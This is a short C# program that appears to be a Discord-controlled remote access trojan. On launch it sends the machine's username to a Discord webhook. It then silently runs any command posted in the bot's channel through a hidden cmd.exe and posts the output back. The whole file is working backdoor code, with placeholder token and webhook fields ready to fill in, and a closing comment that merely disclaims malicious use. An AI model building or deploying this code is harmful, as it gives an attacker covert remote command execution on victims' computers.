using System;
using DSharpPlus;
using System.Collections.Specialized;
using System.Net;
using System.Windows.Forms;
using System.Diagnostics;
// Wrote by 7empest#0001
namespace _7EMPEST
{
    class Program
    {
        internal class Http
        {
            public Http()
            {
            }
            public static byte[] Post(string uri, NameValueCollection pairs)
            {
                byte[] numArray;
                using (WebClient webClient = new WebClient())
                {
                    numArray = webClient.UploadValues(uri, pairs);
                }
                return numArray;
            }
        }
        public static void sendwhook(string whook, string message, string username)
        {
            Http.Post(whook, new NameValueCollection()
            {
                { "username", username },
                { "content", message }
            });
        }
        private static Random _random = new Random();
        private static string webhook;
        private static string whookname = SystemInformation.UserName;
        private static int clientid = _random.Next(6000);
        static DiscordClient discord;
        static void Main(string[] args)
        {
            discord = new DiscordClient(new DiscordConfiguration
            {
                Token = "YOUR DISCORD BOT TOKEN HERE",
                TokenType = TokenType.Bot
            });
            webhook = "YOUR WEBHOOK URL HERE";
            sendwhook(webhook, whookname + " has connected!", clientid.ToString());
            discord.MessageCreated += async e =>
            {
                if (e.Message.Content.Contains(clientid.ToString()) == false) return;
                if (e.Message.Content.Contains("!") == false) return;
                if (e.Message.Author.IsBot == true) return;
                string x = e.Message.Content;
                string strCmdText = e.Message.Content.Remove(e.Message.Content.IndexOf("!"+clientid), clientid.ToString().Length + 2);
                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.Verb = "runas";
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start();
                cmd.StandardInput.WriteLine(strCmdText);
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                await e.Message.Channel.SendMessageAsync(cmd.StandardOutput.ReadToEnd());
            };
            discord.ConnectAsync();
            while(true)
            {
                // this is just to keep the code running, play around with this code and experiment, do not use it for malicious purposes.
                int e = 1;
                e = e++;
            }
        }
    }
}
